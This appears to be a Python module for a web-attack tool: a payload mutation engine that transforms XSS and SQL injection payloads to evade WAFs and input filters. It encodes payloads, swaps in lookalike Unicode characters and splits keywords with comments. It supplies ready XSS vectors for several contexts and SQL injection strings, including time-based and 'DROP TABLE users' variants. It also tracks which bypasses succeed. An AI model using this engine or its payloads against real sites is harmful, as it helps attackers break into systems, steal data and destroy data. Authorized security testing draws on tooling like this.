"""
Payload Mutation Engine - Transforms payloads to bypass filters and adapt to different contexts.

Key Features:
- Multiple encoding strategies (URL, HTML, Unicode, etc.)
- Case variation
- Tag breaking/obfuscation
- Context-aware payload adaptation
- Mutation tracking (detect what works)
"""

import re
from typing import List, Dict, Tuple
from urllib.parse import quote, quote_plus
import html
import unicodedata


class PayloadMutationEngine:
    """Generates and transforms payloads for maximum coverage and bypass potential."""
    
    def __init__(self):
        """Initialize mutation strategies."""
        self.mutation_history: Dict[str, List[Dict]] = {}  # Track successful mutations
    
    def generate_mutations(self, payload: str, mutation_count: int = 5) -> List[Dict]:
        """
        Generate multiple mutations of a single payload.
        
        Returns List of dicts containing:
            - payload: mutated payload string
            - mutation_type: str (encoding/case/obfuscation/tag_break/unicode/event/comment)
            - description: human-readable description
            - bypass_target: what filter/WAF it targets
            - complexity_score: int 1-10 (harder to generate = higher)
        """
        mutations = []
        
        # 1. URL Encoding variants
        mutations.append({
            'payload': quote(payload),
            'mutation_type': 'url_encode',
            'description': f'URL encoded: {quote(payload)[:50]}',
            'bypass_target': 'basic_url_filter',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 2. Double URL Encoding
        mutations.append({
            'payload': quote(quote(payload)),
            'mutation_type': 'double_url_encode',
            'description': f'Double URL encoded',
            'bypass_target': 'legacy_decode_functions',
            'complexity_score': 2,
            'layers': 2
        })
        
        # 3. HTML Entity Encoding
        mutations.append({
            'payload': html.escape(payload),
            'mutation_type': 'html_encode',
            'description': f'HTML entities: {html.escape(payload)[:50]}',
            'bypass_target': 'html_context',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 4. Mixed case variation (for case-insensitive bypasses)
        mutations.append({
            'payload': self._mixed_case(payload),
            'mutation_type': 'case_variation',
            'description': f'Mixed case variation',
            'bypass_target': 'case_sensitive_filter',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 5. Unicode normalization (different representations of same char)
        mutations.append({
            'payload': self._unicode_variation(payload),
            'mutation_type': 'unicode_encode',
            'description': f'Unicode variant characters',
            'bypass_target': 'blacklist_matching',
            'complexity_score': 3,
            'layers': 1
        })
        
        # 6. Null byte injection (old PHP bypass)
        if len(payload) > 0:
            mutations.append({
                'payload': payload + '%00',
                'mutation_type': 'null_byte',
                'description': f'Null byte terminated',
                'bypass_target': 'string_truncation',
                'complexity_score': 2,
                'layers': 1
            })
        
        # 7. Newline/Carriage return injection
        mutations.append({
            'payload': payload.replace(' ', '\n'),
            'mutation_type': 'newline_inject',
            'description': f'Newlines instead of spaces',
            'bypass_target': 'simple_regex',
            'complexity_score': 1,
            'layers': 1
        })
        
        # 8. Comment-based obfuscation
        mutations.append({
            'payload': self._inject_comments(payload),
            'mutation_type': 'comment_obfuscate',
            'description': f'HTML/JS comments injected',
            'bypass_target': 'pattern_matching',
            'complexity_score': 2,
            'layers': 1
        })
        
        # 9. Hex encoding (for binary data)
        mutations.append({
            'payload': self._to_hex(payload),
            'mutation_type': 'hex_encode',
            'description': f'Hex encoded payload',
            'bypass_target': 'string_blacklist',
            'complexity_score': 2,
            'layers': 1
        })
        
        # 10. Backtick substitution (shell command context)
        if '(' in payload or '$' in payload:
            mutations.append({
                'payload': payload.replace('(', '$(') if '(' not in payload[:2] else payload,
                'mutation_type': 'backtick_sub',
                'description': f'Backtick command substitution',
                'bypass_target': 'parenthesis_filter',
                'complexity_score': 2,
                'layers': 1
            })
        
        return mutations[:mutation_count]
    
    def generate_xss_mutations(self, base_payload: str = "alert(1)") -> List[Dict]:
        """
        Generate context-aware XSS mutation variants.
        
        Returns payloads for different contexts:
            - HTML text nodes
            - Attribute values
            - JavaScript code
            - Event handlers
        """
        mutations = []
        
        # Contexts where XSS can manifest
        contexts = {
            'html_text': [
                f'<script>{base_payload}</script>',
                f'<svg onload="{base_payload}">',
                f'<img src=x onerror="{base_payload}">',
                f'<body onload="{base_payload}">',
                f'<iframe srcdoc="<script>{base_payload}</script>">',
            ],
            'html_attribute': [
                f'" onmouseover="{base_payload}" x="',
                f"' onmouseover='{base_payload}' x='",
                f'" autofocus onfocus="{base_payload}" x="',
                f'"><svg onload="{base_payload}">',
            ],
            'javascript': [
                f"';{base_payload};//",
                f'";{base_payload};//',
                f"var x='{base_payload}'",
                f"${base_payload}",
            ],
            'event_handler': [
                f'<img src=x onerror={base_payload}>',
                f'<svg onload={base_payload}>',
                f'<body onload={base_payload}>',
            ]
        }
        
        for context, payloads in contexts.items():
            for payload in payloads:
                mutations.append({
                    'payload': payload,
                    'mutation_type': f'xss_{context}',
                    'description': f'XSS for {context} context',
                    'bypass_target': f'{context}_filter',
                    'complexity_score': 3,
                    'layers': 1
                })
        
        return mutations
    
    def generate_sqli_mutations(self, base_payload: str = "' OR '1'='1") -> List[Dict]:
        """
        Generate SQLi mutations for different injection points and database types.
        """
        mutations = []
        
        # SQL injection variants
        variants = [
            ("' OR '1'='1", "Classic OR 1=1"),
            ("' OR '1'='1' --", "OR with comment"),
            ("' OR 1=1 --", "Numeric OR"),
            ("1' AND 1=1 --", "Numeric AND"),
            ("1' AND '1'='1", "String AND"),
            ("' UNION SELECT NULL --", "Union-based"),
            ("' UNION SELECT NULL,NULL,NULL --", "Union 3 columns"),
            ("1; WAITFOR DELAY '0:0:5' --", "Time-based (MSSQL)"),
            ("' AND SLEEP(5) --", "Sleep-based (MySQL)"),
            ("' AND BENCHMARKED(5000000,MD5('X')) --", "Benchmark (MySQL)"),
            ("' AND (CASE WHEN 1=1 THEN 1 ELSE 0 END) --", "Boolean blind"),
            ("'; DROP TABLE users; --", "Stacked queries"),
        ]
        
        for payload, description in variants:
            mutations.append({
                'payload': payload,
                'mutation_type': 'sqli_variant',
                'description': f'SQLi: {description}',
                'bypass_target': 'sql_filter',
                'complexity_score': 2,
                'layers': 1
            })
        
        return mutations
    
    def generate_context_aware_payload(self, payload: str, context: str) -> str:
        """
        Adapt payload to context where it will be used.
        
        Contexts:
            - html_tag: Inside <tag>
            - html_attribute: Inside attribute="value"
            - javascript: Inside <script> or JS function
            - json: Inside JSON value
            - url: Inside URL parameter
            - header: Inside HTTP header
        """
        context_map = {
            'html_tag': lambda p: f'<script>{p}</script>',
            'html_attribute': lambda p: f'" onmouseover="{p}" x="',
            'html_attribute_single': lambda p: f"' onmouseover='{p}' x='",
            'javascript': lambda p: f"';alert('{p}');//",
            'json': lambda p: f'","value":"{p}","x":"',
            'url': lambda p: quote(p),
            'header': lambda p: p.replace('\r', '').replace('\n', ''),
            'xml': lambda p: f'<item>{p}</item>',
        }
        
        if context in context_map:
            return context_map[context](payload)
        return payload
    
    def track_mutation(self, payload: str, mutation_type: str, successful: bool, 
                      vulnerability_type: str) -> None:
        """Track which mutations work for future optimization."""
        key = f"{vulnerability_type}:{mutation_type}"
        if key not in self.mutation_history:
            self.mutation_history[key] = []
        
        self.mutation_history[key].append({
            'payload': payload,
            'successful': successful,
            'timestamp': __import__('time').time()
        })
    
    def get_most_effective_mutations(self, vulnerability_type: str, limit: int = 3) -> List[str]:
        """
        Return most effective mutation types for a vulnerability type.
        
        Based on tracked success rate.
        """
        effective = []
        for key, attempts in self.mutation_history.items():
            if vulnerability_type in key:
                successes = sum(1 for a in attempts if a['successful'])
                success_rate = successes / len(attempts) if attempts else 0
                if success_rate > 0.5:  # Success rate threshold
                    mutation_type = key.split(':')[1]
                    effective.append(mutation_type)
        
        return effective[:limit]
    
    # ===== Private Helper Methods =====
    
    def _mixed_case(self, payload: str) -> str:
        """Convert payload to mixed case (ScRiPt vs script)."""
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                result.append(char.upper() if i % 2 == 0 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    def _unicode_variation(self, payload: str) -> str:
        """Replace characters with unicode equivalents when possible."""
        # This is advanced - use lookalike characters
        replacements = {
            'a': '\u0430',  # Cyrillic 'a'
            'o': '\u043e',  # Cyrillic 'o'
            'e': '\u0435',  # Cyrillic 'e'
            'p': '\u0440',  # Cyrillic 'p'
            'c': '\u0441',  # Cyrillic 'c'
            'x': '\u0445',  # Cyrillic 'x'
            'y': '\u0443',  # Cyrillic 'y'
            'h': '\u04bb',  # Cyrillic 'h'
        }
        
        result = []
        for char in payload.lower():
            if char in replacements and len(payload) > 3:  # Only for longer payloads
                result.append(replacements[char])
            else:
                result.append(char)
        return ''.join(result)
    
    def _inject_comments(self, payload: str) -> str:
        """Inject comments to break pattern matching."""
        # For XSS
        if '<script>' in payload:
            return payload.replace('<script>', '<scr<!---->ipt>')
        if 'script' in payload.lower():
            return re.sub(r'script', 'scr<!---->ipt', payload, flags=re.I)
        
        # For SQL
        if "'" in payload:
            return payload.replace("'", "/**/'\"/**/'")
        
        # Generic comment injection
        return f"/*!{payload}*/" if payload.strip() else payload
    
    def _to_hex(self, payload: str) -> str:
        """Convert payload to hex representation."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def get_payload_complexity(self, payload: str) -> int:
        """
        Estimate payload complexity (1-10).
        
        Factors:
            - Length
            - Special characters
            - Encoding layers
            - Nesting depth
        """
        score = 1
        
        # Length factor
        score += min(len(payload) // 10, 3)
        
        # Special character factor
        special_chars = len(re.findall(r'[<>{}()\[\]"\';]', payload))
        score += min(special_chars // 3, 3)
        
        # Encoding detection
        if any(x in payload for x in ['%', '\\x', '&#', '&lt;']):
            score += 1
        
        # Nesting
        nesting = max(
            payload.count('(') - payload.count(')'),
            payload.count('[') - payload.count(']'),
            payload.count('{') - payload.count('}')
        )
        score += min(nesting, 2)
        
        return min(score, 10)
